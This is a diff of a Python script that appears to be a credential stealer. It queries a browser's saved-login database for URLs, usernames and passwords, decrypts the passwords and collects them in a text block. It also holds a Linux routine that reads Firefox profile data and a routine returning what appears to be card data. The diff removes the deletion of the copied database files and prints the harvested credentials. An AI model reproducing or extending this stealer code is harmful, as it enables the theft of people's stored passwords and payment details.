@@ -373,7 +373,6 @@ if yes == "yes":
 
 			try:
 				cursor.execute("SELECT action_url, username_value, password_value FROM logins")
-				print(cursor.fetchall())
 				for r in cursor.fetchall():
 					url = r[0]
 					username = r[1]
@@ -383,22 +382,13 @@ if yes == "yes":
 					binks = binks +(f"User name: {username}\n")
 					binks = binks +(f"Decrypted Password: {decrypted_password}\n\n")
 					binks = binks + ("=" * 100)
+					print(binks)
 			except Exception as e:
 				print(e)
 
 			cursor.close()
 			conn.close()
-			try:
-				os.remove(dbpath)
-			except Exception as e:
-				pass
-
-
-			try:
-				os.remove(filename)
-			except:
-				pass
-		return binks
+			return binks
 	def PasswLinux():
 		try:
 			FirefoxPath = os.path.expanduser("~/.mozilla/firefox/")
@@ -601,7 +591,7 @@ if yes == "yes":
 				except:
 					pass
 		except ZeroDivisionError as e:
-	  		return str(e)
+	  		print(str(e))
 		return ccss
 
 
